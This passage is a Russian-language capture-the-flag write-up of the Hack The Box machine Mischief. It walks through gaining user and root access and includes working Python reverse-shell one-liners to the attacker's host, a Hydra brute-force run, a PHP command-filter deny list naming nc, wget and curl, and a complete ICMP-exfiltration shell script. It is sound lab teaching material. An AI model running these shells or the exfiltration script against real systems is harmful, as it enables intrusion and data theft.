Last login: Sat Jul 14 12:44:04 2018 from 10.10.14.4
loki@Mischief:~$ whoami
loki
```

#### user.txt
```text
loki@Mischief:~$ cat user.txt
bf58078e????????????????????????
```

### 2-й способ: Reverse-Shell
Самозванный WAF не блочит `python`, поэтому скрафтим на его основе реверс-шелл и попытаемся поймать отклик:
```text
root@kali:~# ./command_execution_panel.sh 'dead:beef::250:56ff:feb9:7caa' 'PHPSESSID=lofmvtjj3hq2jfp1pgev2bh1pb'
mischief> python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",31337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'

```

*«И лишь тишина была ему ответом...»*

Шелл не вернулся, но по характерному зависанию могу предположить, что исходящий трафик фильтруется... IPv4-трафик :smiling_imp:

А вот с IPv6-шеллом [все прекрасно]({{ page.url }}#iptables):
```text
root@kali:~# ./command_execution_panel.sh 'dead:beef::250:56ff:feb9:7caa' 'PHPSESSID=lofmvtjj3hq2jfp1pgev2bh1pb'
mischief> python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1009",31337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/sh");s.close()'

```

```text
(или так: nc -lvn dead:beef:2::1009 31337)

root@kali:~# nc -6 -lvnp 31337
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Connection from dead:beef::250:56ff:feb9:7caa.
Ncat: Connection from dead:beef::250:56ff:feb9:7caa:47306.
$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@Mischief:/var/www/html$ cat /home/loki/credentials
cat /home/loki/credentials
pass: lokiisthebestnorsegod
www-data@Mischief:/var/www/html$ su - loki
su - loki
Password: lokiisthebestnorsegod

loki@Mischief:~$ whoami
whoami
loki
```

```text
loki@Mischief:~$ cat user.txt
cat user.txt
bf58078e????????????????????????
```

# PrivEsc: loki → root
## Пароль в .bash_history
Осматриваясь на хосте, в `.bash_history` был найден пароль для питоновского сервера, на первый взгляд очень похожий на один из тех, который встречался нам раньше:
```text
loki@Mischief:~$ cat .bash_history
python -m SimpleHTTPAuthServer loki:lokipasswordmischieftrickery
exit
free -mt
ifconfig
cd /etc/
sudo su
su
exit
su root
ls -la
sudo -l
ifconfig
id
cat .bash_history
nano .bash_history
exit
```

Но нет, это оказался пароль от рута `root:lokipasswordmischieftrickery` :neutral_face:

## su от имени loki
Будучи авторизированным под loki, мы не можем повысить привилегии через su:
```text
loki@Mischief:~$ su -
-bash: /bin/su: Permission denied
```

Почему? Хороший вопрос.

Запускать бинарник могут все:
```text
ls -l /bin/su
-rwsr-xr-x+ 1 root root 44664 Jan 25  2018 /bin/su
```

Но вот списки контроля доступа ([ACL](https://wiki.archlinux.org/index.php/Access_Control_Lists_(Русский) "Access Control Lists (Русский) - ArchWiki"), aka ***A**ccess **C**ontrol **L**ists*) говорят, что как раз loki запрещено выполнять su:
```text
loki@Mischief:~$ getfacl /bin/su
getfacl: Removing leading '/' from absolute path names
# file: bin/su
# owner: root
# group: root
# flags: s--
user::rwx
user:loki:r--
group::r-x
mask::r-x
other::r-x
```

Такая же история с sudo:
```text
loki@Mischief:~$ getfacl /usr/bin/sudo
getfacl: Removing leading '/' from absolute path names
# file: usr/bin/sudo
# owner: root
# group: root
# flags: s--
user::rwx
user:loki:r--
group::r-x
mask::r-x
other::r-x
```

Кстати, найти все, к чему применены ACL'ы можно так:
```text
loki@Mischief:~$ getfacl -R -s -p / 2>/dev/null | sed -n 's/^# file: //p'
//usr/bin/sudo
//bin/su
```

Поэтому нам нужен другой способ ввести креди суперпользователя.

## 1-й способ: su от имени www-data
Здесь все просто — возвращаемся к самопальному `command_execution_panel.sh`, снова триггерим шелл и оттуда эскалируемся до рута:
```text
www-data@Mischief:/var/www/html$ su -
Password: lokipasswordmischieftrickery

root@Mischief:~# whoami
root

root@Mischief:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## 2-й способ: systemd-run
Если не можем воспользоваться su, чтобы сменить пользователя, то можем сделать это через systemd-run.

Да, таким образом я не получу шелл "здесь и сейчас", но я смогу инициировать IPv6 реверс-шелл, как мы делали это раньше:
```text
loki@Mischief:~$ systemd-run python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1009",31337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/sh");s.close()'
==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===
Authentication is required to manage system services or other units.
Authenticating as: root
Password: lokipasswordmischieftrickery
==== AUTHENTICATION COMPLETE ===
Running as unit: run-u19.service
```

```text
root@kali:~# nc -lvnp 31337
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::31337
Ncat: Listening on 0.0.0.0:31337
Ncat: Connection from dead:beef::250:56ff:feb9:7caa.
Ncat: Connection from dead:beef::250:56ff:feb9:7caa:47312.
# whoami
whoami
root
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## 3-й способ: lxc [ИСПРАВЛЕНО]
Еще один способ, относящийся к "unintended solutions". На момент релиза Mischief пользователю было разрешено выполнять команду lxc. [LXC](https://ru.wikipedia.org/wiki/LXC "LXC — Википедия") (aka ***L**inux **C**ontainers*) — это такая docker-like система виртуализации на уровне ОС для запуска нескольких инстансов Linux на одном хосте.

Подвержена той же уязвимости, что и docker-контейнеры, о чем мы уже говорили в [прохождении Olympus](https://snovvcrash.github.io/2018/10/03/htb-olympus-write-up.html#privesc-prometheus--root-способ-1 "HTB{ Olympus } / snovvcrash’s Security Blog").

Исправлено 2018-07-16:

[![lxc-patch.png]({{ "/img/htb/boxes/mischief/lxc-patch.png" | relative_url }})]({{ "/img/htb/boxes/mischief/lxc-patch.png" | relative_url }})

К сожалению, я начал возиться с машиной уже после фикса, поэтому этот способ PrivEsc'а прошел мимо меня :disappointed_relieved:

## Ищем root.txt
Получив root-сессию любым из способов выше и заглянув в `/root/root.txt`, видим следующее:
```text
root@Mischief:~# cat root.txt
The flag is not here, get a shell to find it!
```

~~Нае~~ Обманули :rage:

Судя по сообщению, к моменту прочтения флага у нас еще не должно было быть шелла по задумке автора.

Но у нас он есть, поэтому нам не составит труда найти настоящий хеш привилегированного пользователя:
```text
root@Mischief:~# find / -type f -name root.txt 2>/dev/null
/usr/lib/gcc/x86_64-linux-gnu/7/root.txt
/root/root.txt
```

### root.txt
```text
root@Mischief:~# cat /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
ae155fad????????????????????????
```

Tricked :triumph:

# Эпилог
## IPv6-адрес с помошью EUI-64
Рассмотрим, как работает [механизм](http://ciscotips.ru/eui-64 "Получение IPv6 адреса с помошью EUI-64 | CiscoTips") автоматической генерации link-local IPv6-адреса с помощью [EUI-64](https://ru.wikipedia.org/wiki/Уникальный_идентификатор_организации#64-битный_расширенный_уникальный_идентификатор_EUI-64 "Уникальный идентификатор организации — Википедия") из MAC-адреса на примере Mischief.

Для этого нам нужно находиться на одном канальном уровне (aka *OSI layer 2*) с тем хостом, адрес которого мы хотим узнать. Пусть, это будет [Hawk](https://snovvcrash.github.io/2018/12/09/htb-hawk-write-up.html "HTB{ Hawk } / snovvcrash’s Security Blog").

Дадим пинг от Hawk до Mischief и запросим ARP-таблицу для того, чтобы вытащить MAC Mischief:
```text
root@hawk:~$ ping 10.10.10.92
PING 10.10.10.92 (10.10.10.92) 56(84) bytes of data.
64 bytes from 10.10.10.92: icmp_seq=1 ttl=64 time=64.0 ms
^C
--- 10.10.10.92 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 64.063/64.063/64.063/0.000 ms

root@hawk:~$ arp -a
_gateway (10.10.10.2) at 00:50:56:aa:f1:dd [ether] on ens33
? (10.10.10.92) at 00:50:56:b9:7c:aa [ether] on ens33
```

Есть MAC-адрес — `00:50:56:b9:7c:aa`.

Чтобы получить из него link-local IPv6-адрес, нужно провести следующие нехитрые манипуляции:
  1. Сгруппируем MAC в привычной для IPv6 формы, а именно, по 2 октета — `0050:56b9:7caa`.
  2. В начало MAC'а дописываем `fe80::` — `fe80::0050:56b9:7caa`.
  3. В середину MAC'а вставляем `ff:fe` — `fe80::0050:56ff:feb9:7caa`.
  4. Инвертируем шестой бит MAC'а — `fe80::0250:56ff:feb9:7caa` (было `0000 0000`, стало `0000 0010` или `0x02`).
  5. Через символ процента указываем интерфейс (т. к. в мире IPv6 адреса привязываются к интерфейсам, а не к узлам, и если не указать интерфейс, трафик не будет знать, куда ему ходить) — `fe80::0250:56ff:feb9:7caa%ens33`.

Проверяем:
```text
root@hawk:~$ ping6 -c4 fe80::0250:56ff:feb9:7caa%ens33
PING fe80::0250:56ff:feb9:7caa%ens33(fe80::250:56ff:feb9:7caa%ens33) 56 data bytes
64 bytes from fe80::250:56ff:feb9:7caa%ens33: icmp_seq=1 ttl=64 time=136 ms
64 bytes from fe80::250:56ff:feb9:7caa%ens33: icmp_seq=2 ttl=64 time=0.236 ms
64 bytes from fe80::250:56ff:feb9:7caa%ens33: icmp_seq=3 ttl=64 time=0.240 ms
64 bytes from fe80::250:56ff:feb9:7caa%ens33: icmp_seq=4 ttl=64 time=0.272 ms

--- fe80::0250:56ff:feb9:7caa%ens33 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3031ms
rtt min/avg/max/mdev = 0.236/34.259/136.290/58.907 ms
```

It's magic! Теоретически, можно было бы продолжать прохождение через проксирование этой машины, если бы была такая необходимость, но, к счастью, у нас были другие пути.

## Hydra
Не смотря на то, что, оказывается, авторизацию можно [просто обойти]({{ page.url }}#rce-без-авторизации), сбрутить ее тоже дело не сложное:
```text
root@kali:~# cat passwords.lst
godofmischiefisloki
trickeryanddeceit
```

```text
root@kali:~# hydra -V -t 4 -f -I -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P passwords.lst 'dead:beef:0000:0000:0250:56ff:feb9:7caa' http-form-post '/login.php:user=^USER^&password=^PASS^:Sorry, those credentials do not match'
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-04-04 23:33:58
[DATA] max 4 tasks per 1 server, overall 4 tasks, 34 login tries (l:17/p:2), ~9 tries per task
[DATA] attacking http-post-form://[dead:beef:0000:0000:0250:56ff:feb9:7caa]:80/login.php:user=^USER^&password=^PASS^:Sorry, those credentials do not match
[ATTEMPT] target dead:beef:0000:0000:0250:56ff:feb9:7caa - login "root" - pass "godofmischiefisloki" - 1 of 34 [child 0] (0/0)
[ATTEMPT] target dead:beef:0000:0000:0250:56ff:feb9:7caa - login "root" - pass "trickeryanddeceit" - 2 of 34 [child 1] (0/0)
[ATTEMPT] target dead:beef:0000:0000:0250:56ff:feb9:7caa - login "admin" - pass "godofmischiefisloki" - 3 of 34 [child 2] (0/0)
[ATTEMPT] target dead:beef:0000:0000:0250:56ff:feb9:7caa - login "admin" - pass "trickeryanddeceit" - 4 of 34 [child 3] (0/0)
[80][http-post-form] host: dead:beef:0000:0000:0250:56ff:feb9:7caa   login: root   password: godofmischiefisloki
[STATUS] attack finished for dead:beef:0000:0000:0250:56ff:feb9:7caa (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-04-04 23:34:00
```

## RCE без авторизации
Забавно, но я только после прохождения осознал, что команды в Command Execution Panel можно выполнять и без авторизации.

Если посмотреть на исходники `/var/www/html/index.php`:
```php
<?php

session_start();

require 'database.php';

if( isset($_SESSION['user_id']) ){
    ...
}

...

if(isset($_POST['command'])) {
    ...
}

?>
```

То становится очевидно, почему так: ветка `if(isset($_POST['command']))` не требует авторизации :sweat_smile:

То есть можно было не париться о кукисах в наших bash-скриптах [здесь]({{ page.url }}#фильтрация-команд) и [здесь]({{ page.url }}#1-й-способ-homelokicredentials). Узнать об этом *до* pwn'а пользователя можно было брутом параметров запроса с помощью `wfuzz`, например.

## WAF
Посмотрим, как устроен механизм фильтрации команд Command Execution Panel.

Для этого отправимся в `/var/www/html` и изучим `index.php`:
```text
loki@Mischief:/var/www/html$ cat index.php
```

```php
...
if(isset($_POST['command'])) {
        $cmd = $_POST['command'];
        if (strpos($cmd, "nc" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "bash" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "chown" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "setfacl" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "chmod" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "perl" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "find" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "locate" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "ls" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "php" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "wget" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "curl" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "dir" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "ftp" ) !== false){
                echo "Command is not allowed.";
        } elseif (strpos($cmd, "telnet" ) !== false){
                echo "Command is not allowed.";
        } else {
                system("$cmd > /dev/null 2>&1");
                echo "Command was executed succesfully!";
        }
...
```

Что и требовалось доказать: много `elseif`'ов с условиями `strpos($cmd, "STRING") !== false`. Лучшим способов обходить такие фильтры есть использование символа `*` для автодополнения команд (что мы, собственно, и делали).

К слову, извлечь все запрещенные команды можно таким oneliner'ом:
```text
loki@Mischief:/var/www/html$ cat index.php | grep strpos | cut -d '"' -f2
nc
bash
chown
setfacl
chmod
perl
find
locate
ls
php
wget
curl
dir
ftp
telnet
```

В этом же сегменте исходника, кстати, становится очевидно, откуда растут ноги у бага с отображением вывода stacked-команд: при сцеплении оных с помощью `;` в /dev/null отправляется результат выполнения только *последний* команды.

## ICMP-Shell
Подобрались к самой творческой части прохождения. Представим ситуацию, в которой мы бы не обнаружили возможность просмотра результата выполнения команд прямо в браузере. Такой исход и подразумевал автор, и в этом случае нам бы пришлось мастерить **ICMP-шелл**.

Что такое ICMP-шелл? Вспомним, какая команда в Command Execution Panel была единственно легитимной... Это была команда `ping`. Если открыть мануал ping'а, можно увидеть интересный флаг, который окажется нашим спасителем в этой трудной ситуации:
> -p pattern
>
> You may specify up to 16 "pad" bytes to fill out the packet you send.  This is useful for diagnosing data-dependent problems in a network.
> For example, -p ff will cause the sent packet to be filled with all ones.

ping позволяет отправлять 16 произвольных "диагностических" байт с каждым ICMP-запросом. Следовательно, если в качестве таких байт подавать результат выполненных операций на хосте, мы получим шелл. Грубый самопальный шелл, но все же шелл! На этапе поиска уязвимых мест жертвы этого вполне хватит.

### Ядро
Ядром будущего шелла станет bash-инъекция следующего вида:
```bash
{ $CMD; echo STOPSTOPSTOPSTOP; } 2>&1 | xxd -p | tr -d '\\n' | fold -w 32 | while read output; do ping -c 1 -p $output {LHOST}; done
```

Что здесь происходит слева направо:
  1. С помощью фигурных скобок сцепляется вывод двух команд: непосредственная команда, которую задает оператор ICMP-шелла (`$CMD`) и запись "маркера останова" (`echo STOPSTOPSTOPSTOP`), о предназначении которого чуть позже.
  2. `stdout` комбинируется с `stderr`, чтобы иметь возможность видеть сообщения об ошибках.
  3. Результат первых двух шагов по конвееру отправляется в `xxd -p`, который преобразует ASCII в hex.
  4. `tr -d` избавляется от символов перевода строки.
  5. `fold -w` вставляет символ перевода строки каждые 32 символа (16 байт, как раз столько, сколько может отправить `ping` в одном пакете).
  6. В цикле `while` **построчно** (помним, что на одной строке заведомо 16 байт) читается организованный результат выполнения команды, переведенный в шестнадцатиричный вид и триггерится `ping`, который отправляет по одному ICMP-пакету с каждой следующей прочтенной строкой в качестве "диагностических" байт на целевой хост (`$LHOST` — машина атакующего).

Зачем нам нужен "маркер останова"? Представим ситуацию: мы хотим получить вывод команды `whoami`. Пусть пользователя зовут `root`, тогда после выполнения команды:
```bash
whoami 2>&1 | xxd -p | tr -d '\\n'  # выведет "726f6f740a"
```

Мы получим такой результат `726f6f740a`, в котором всего 10 символов, что однозначно меньше, чем 32. В таком случае инструкция `fold -w 32` будет бесполезна, т. к. мы не добили вывод до нужной длины, и поэтому циклу `while` просто будет нечего читать, т. к. он не увидит символ перевода на новую строку (и поэтому будет считать, что вывод пустой).

Поэтому я добавляю "маркер останова" длиной в 16 байт (32 символа), ролью которого является добивание результата вывода команды с гарантированным переходом на новую строку, чтобы `while` прочитал и отправил даже самый короткий вывод.

### ICMPShell.py
Для автоматизации процесса выше напишем Python-скрипт с использованием модуля `scapy` для реализации сниффера ICMP-пакетов (в качестве альтернативы можно использовать модуль `impacket` как, например, [здесь](https://github.com/inquisb/icmpsh/blob/master/icmpsh_m.py "icmpsh/icmpsh_m.py at master · inquisb/icmpsh"), но мне scapy больше по душе):
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Usage: python3 ICMPShell.py <LHOST> <RHOST>

import cmd
import sys
from threading import Thread
from urllib.parse import quote_plus

import requests
from scapy.all import *

M = '\033[%s;35m'  # MAGENTA
Y = '\033[%s;33m'  # YELLOW
R = '\033[%s;31m'  # RED
S = '\033[0m'      # RESET

MARKER = 'STOP'


class ICMPSniffer(Thread):

	def __init__(self, iface='tun0'):
		super().__init__()
		self.iface = iface

	def run(self):
		sniff(iface=self.iface, filter='icmp[icmptype]==8', prn=self.process_icmp)

	def process_icmp(self, pkt):
		buf = pkt[ICMP].load[16:32].decode('utf-8')

		setmarker = set(MARKER)
		if set(buf[-4:]) == setmarker and set(buf) != setmarker:
				buf = buf[:buf.index(MARKER)]

		print(buf, end='', flush=True)


class Terminal(cmd.Cmd):

	prompt = f'{M%0}ICMPShell{S}> '

	def __init__(self, LHOST, RHOST, proxies=None):
		super().__init__()

		if proxies:
			self.proxies = {'http': proxies}
		else:
			self.proxies = {}

		self.LHOST = LHOST
		self.RHOST = RHOST
		self.inject = r"""{ {cmd}; echo {MARKER}; } 2>&1 | xxd -p | tr -d '\\n' | fold -w 32 | while read output; do ping -c 1 -p $output {LHOST}; done"""

	def do_cmd(self, cmd):
		try:
			resp = requests.post(
				f'http://{self.RHOST}/',
				data=f'command={quote_plus(self.inject.format(cmd=cmd, MARKER=MARKER*4, LHOST=self.LHOST))}',
				headers={'Content-Type': 'application/x-www-form-urlencoded'},
				proxies=self.proxies
			)

			if resp.status_code == 200:
				if 'Command is not allowed.' in resp.text:
					print(f'{Y%0}[!] Command triggers WAF filter. Try something else{S}')

		except requests.exceptions.ConnectionError as e:
			print(str(e))
			print(f'{R%0}[-] No response from {self.RHOST}{S}')

		finally:
			print()

	def do_EOF(self, args):
		print()
		return True

	def emptyline(self):
		pass


if __name__ == '__main__':
	if len(sys.argv) < 3:
		print(f'Usage: python3 {sys.argv[0]} <LHOST> <RHOST>')
		sys.exit()
	else:
		LHOST = sys.argv[1]
		RHOST = sys.argv[2]

	sniffer = ICMPSniffer()
	sniffer.daemon = True
	sniffer.start()

	terminal = Terminal(
		LHOST,
		RHOST,
		# proxies='http://127.0.0.1:8080'  # Burp
	)
	terminal.cmdloop()
```

Подробно объянять код не буду, он довольно интуитивный, а райтап и так уже обещает получиться слишком объемным :neckbeard:

Результат работы можно наблюдать ниже (на панели справа активен `tcpdump`, также как и шелл парсящий входящие ICMP-пакеты):

[![icmp-shell.gif]({{ "/img/htb/boxes/mischief/icmp-shell.gif" | relative_url }})]({{ "/img/htb/boxes/mischief/icmp-shell.gif" | relative_url }})

## iptables
Раз уж мы захватили root, в качестве вишинки на торте посмотрим на правила iptables:
```text
root@Mischief:~# iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination
ACCEPT     udp  --  anywhere             anywhere             udp spt:snmp
ACCEPT     udp  --  anywhere             anywhere             udp dpt:snmp
DROP       udp  --  anywhere             anywhere
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:3366
DROP       tcp  --  anywhere             anywhere

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
ACCEPT     udp  --  anywhere             anywhere             udp dpt:snmp
ACCEPT     udp  --  anywhere             anywhere             udp spt:snmp
DROP       udp  --  anywhere             anywhere
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:3366
DROP       tcp  --  anywhere             anywhere
```

Разрешен только snmp, ssh и 3366 TCP на вход и выход.

А вот если попросить правила для ip6tables:
```text
root@Mischief:~# ip6tables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
```

Тадааа, все разрешено. Это объясняет, почему мы смогли получить IPv6 реверс-шелл и обломались с IPv4.

*«Локи — хитрейший лгун, бог озорства и обмана, самый очаровательный из всех богов скандинавской мифологии»* :innocent:

{: .center-image}
![owned-user.png]({{ "/img/htb/boxes/mischief/owned-user.png" | relative_url }})

{: .center-image}
![owned-root.png]({{ "/img/htb/boxes/mischief/owned-root.png" | relative_url }})

{: .center-image}
![trophy.png]({{ "/img/htb/boxes/mischief/trophy.png" | relative_url }})
